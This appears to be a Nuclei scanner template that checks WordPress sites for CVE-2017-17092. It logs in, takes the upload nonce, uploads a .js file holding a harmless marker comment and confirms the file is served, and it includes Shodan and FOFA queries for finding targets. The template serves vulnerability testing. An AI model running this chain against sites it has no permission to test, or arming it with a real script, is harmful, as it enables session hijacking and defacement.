flow: http(1) && http(2) && http(3) && http(4)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(header, "wordpress_logged_in")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- extractors:
  - group: 1
    internal: true
    name: nonce
    regex:
    - '"_wpnonce":"([a-f0-9]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '_wpnonce')
    internal: true
    type: dsl
  raw:
  - 'GET /wp-admin/upload.php HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: upload_year
    regex:
    - uploads\\/([0-9]+)\\/[0-9]+\\/[^"]+\.js
    type: regex
  - group: 1
    internal: true
    name: upload_month
    regex:
    - uploads\\/[0-9]+\\/([0-9]+)\\/[^"]+\.js
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "success",".js")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/async-upload.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}


    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="name"


    {{filename}}.js

    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="action"


    upload-attachment

    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="_wpnonce"


    {{nonce}}

    ------WebKitFormBoundary{{randstr}}

    Content-Disposition: form-data; name="async-upload"; filename="{{filename}}.js"

    Content-Type: application/javascript


    //{{marker}}

    ------WebKitFormBoundary{{randstr}}--

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "//{{marker}}")
    type: dsl
  raw:
  - 'GET /wp-content/uploads/{{upload_year}}/{{upload_month}}/{{filename}}.js HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2017-17092
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:wordpress:wordpress:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-17092
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.86849
    epss-score: 0.03307
  description: 'WordPress before 4.9.1 contains a cross-site scripting caused by not
    requiring unfiltered_html capability for uploading .js files in functions.php,
    letting remote attackers execute scripts via crafted files, exploit requires upload
    permissions.

    '
  impact: 'Remote attackers can execute arbitrary JavaScript in the context of the
    site, leading to potential session hijacking or defacement.

    '
  metadata:
    fofa-query: body="oembed" && body="wp-"
    max-request: 4
    product: wordpress
    shodan-query: http.component:"wordpress"
    vendor: wordpress
    verified: true
  name: WordPress < 4.9.1 - Authenticated JavaScript File Upload
  reference:
  - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
  - https://wpscan.com/vulnerability/0d2323bd-aecd-4d58-ba4b-597a43034f57
  - https://nvd.nist.gov/vuln/detail/CVE-2017-17092
  - https://lists.debian.org/debian-lts-announce/2017/12/msg00019.html
  - https://wpvulndb.com/vulnerabilities/8966
  remediation: 'Update to WordPress 4.9.1 or later.

    '
  severity: medium
  tags: cve,cve2017,wordpress,wpscan,xss,upload,authenticated,intrusive,file-upload
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
  marker: '{{to_lower(rand_text_alpha(5))}}'
